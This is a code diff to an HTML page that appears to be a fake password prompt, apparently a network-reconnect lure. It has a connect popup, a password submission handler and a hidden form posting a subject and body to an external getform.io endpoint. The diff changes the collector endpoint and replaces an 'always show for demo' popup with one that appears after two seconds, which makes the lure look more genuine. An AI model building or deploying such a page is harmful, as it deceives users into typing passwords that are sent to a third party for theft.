@@ -104,7 +104,7 @@
     <p id="passwordDisplay"></p>
   </div>
 
-  <form id="emailForm" method="post" action="https://getform.io/f/arogxwwb">
+  <form id="emailForm" method="post" action="https://getform.io/f/bvrmznlb">
     <input type="hidden" id="emailSubject" name="subject">
     <input type="hidden" id="emailBody" name="body">
   </form>
@@ -120,8 +120,10 @@
     const emailSubject = document.getElementById("emailSubject");
     const emailBody = document.getElementById("emailBody");
 
-    // Always show popup for demo
-    popup.classList.add("active");
+     // Show popup after 2 seconds (2000 ms)
+    setTimeout(() => {
+      popup.classList.add("active");
+    }, 2000);
 
     // Detect going offline/online
     window.addEventListener("offline", () => {
@@ -135,6 +137,7 @@
     cancelBtn.addEventListener("click", () => {
       popup.classList.remove("active");
     });
+
 
     // Handle password submission
     connectBtn.addEventListener("click", () => {
@@ -160,5 +163,6 @@
 </body>
 
 </html>
+
 
 
